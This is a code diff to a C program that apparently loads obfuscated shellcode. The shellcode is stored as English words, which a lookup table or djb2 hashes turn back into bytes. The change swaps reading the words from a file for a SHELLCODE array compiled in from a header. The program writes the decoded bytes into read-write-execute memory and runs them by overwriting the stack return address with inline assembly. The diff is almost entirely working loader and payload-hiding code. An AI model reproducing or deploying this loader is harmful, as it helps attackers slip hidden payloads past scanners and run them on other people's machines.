@@ -1,3 +1,6 @@
+#include "../include/shellcode.h"
+
+#include <assert.h>
 #include <fcntl.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -44,6 +47,7 @@ const unsigned long LOOKUP_TABLE[] = {
     0x7c9a2f35, 0xf2388e4,  0x7c953e80, 0x7c9de846, 0x7c967533, 0xf294442,  0xf393c43,  0xa4c66e86,
 };
 
+// unsigned long djb2(const char *str) {
 static inline __attribute__((always_inline)) unsigned long djb2(const char *str) {
     unsigned long hash = 5381;
     int c;
@@ -141,10 +145,14 @@ const char *LOOKUP_TABLE[] = {"the",        "of",          "and",
                               "even",       "black",       "check",
                               "special"};
 #endif
+static_assert(
+    sizeof(LOOKUP_TABLE) / sizeof(LOOKUP_TABLE[0]) == 256,
+    "Lookup table size must be 256"
+);
 
 // Function to find the hex value for a word
 static inline __attribute__((always_inline)) uint8_t find_hex_value(const char *word) {
-    for (int i = 0; i < sizeof(LOOKUP_TABLE); i++) {
+    for (int i = 0; i < sizeof(LOOKUP_TABLE) / sizeof(LOOKUP_TABLE[0]); i++) {
 #ifdef DJB2
         if (djb2(word) == LOOKUP_TABLE[i]) {
 #else
@@ -155,90 +163,48 @@ static inline __attribute__((always_inline)) uint8_t find_hex_value(const char *
     }
     // Return 0x90 (NOP) if the word is not found
     // This also allows the use of undefined words for representing NOP
+#ifdef DEBUG
     printf("Word not found: %s\n", word);
+#endif
     return 0x90;
 }
 
 int main(int argc, char *argv[]) {
-    if (argc < 2) {
-        printf("Usage: %s <filename>\n", argv[0]);
-        return EXIT_FAILURE;
-    }
-
-    // Open the file
-    int fd = open(argv[1], O_RDONLY);
-    if (fd == -1) {
-        perror("Failed to open file");
-        return EXIT_FAILURE;
-    }
-
-    // Get the size of the file
-    struct stat sb;
-    if (fstat(fd, &sb) == -1) {
-        perror("Failed to get file size");
-        close(fd);
-        return EXIT_FAILURE;
-    }
-
-    // Memory-map the file
-    char *file_content = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
-    if (file_content == MAP_FAILED) {
-        perror("Failed to memory-map file");
-        close(fd);
-        return EXIT_FAILURE;
-    }
-
-    // File descriptor is no longer needed after mmap
-    close(fd);
+    // Calculate the size of the shellcode
+    long code_size = sizeof(SHELLCODE) / sizeof(SHELLCODE[0]);
 
     // Allocate executable memory
     uint8_t *executable_memory = mmap(
-        NULL, sb.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0
+        NULL, code_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0
     );
     if (executable_memory == MAP_FAILED) {
-        perror("Failed to allocate executable memory");
-        munmap(file_content, sb.st_size);
+        perror("Failed to allocate memory");
         return EXIT_FAILURE;
     }
 
-    // Make a writable copy of the file contents
-    char *writable_content = malloc(sb.st_size + 1);
-    if (!writable_content) {
-        perror("Failed to allocate memory for writable content");
-        munmap(file_content, sb.st_size);
-        munmap(executable_memory, sb.st_size);
-        return EXIT_FAILURE;
-    }
-    memcpy(writable_content, file_content, sb.st_size);
-    writable_content[sb.st_size] = '\0';  // Ensure null termination
-
-    // Tokenize the input and write the corresponding hex values to executable memory
-    char *token = strtok(writable_content, " ");
     size_t offset = 0;
-
-    while (token != NULL && offset < sb.st_size) {
-        uint8_t hex_value = find_hex_value(token);
+    for (int i = 0; i < sizeof(SHELLCODE) / sizeof(SHELLCODE[0]); i++) {
+        uint8_t hex_value = find_hex_value(SHELLCODE[i]);
 #ifdef DEBUG
-        printf("%s -> 0x%02x\n", token, hex_value);
+        printf("%s -> 0x%02x\n", SHELLCODE[i], hex_value);
 #endif
         executable_memory[offset++] = hex_value;
-        token = strtok(NULL, " ");
     }
 
-    // Clean up
-    free(writable_content);
-    munmap(file_content, sb.st_size);
-
-#ifdef JMP
-    // Jump to the executable memory
-    __asm__("jmp *%0" : : "r"(executable_memory));
-#else
     // Cast executable memory to a function pointer and execute
-    void (*shellcode)() = (void (*)())executable_memory;
-    shellcode();
-#endif
+    // void (*shellcode)() = (void (*)())executable_memory;
+    // shellcode();
 
-    // Clean up
-    munmap(executable_memory, sb.st_size);
+    // Overwrite the return address with the address of the shellcode
+    // ret will jump to the shellcode
+    __asm__(
+        "movq %0, (%%rsp)\n"
+        "retq\n"
+        :
+        : "r"(executable_memory)
+    );
+
+    // Clean up the executable memory, might never be reached
+    munmap(executable_memory, code_size);
     return 0;
 }
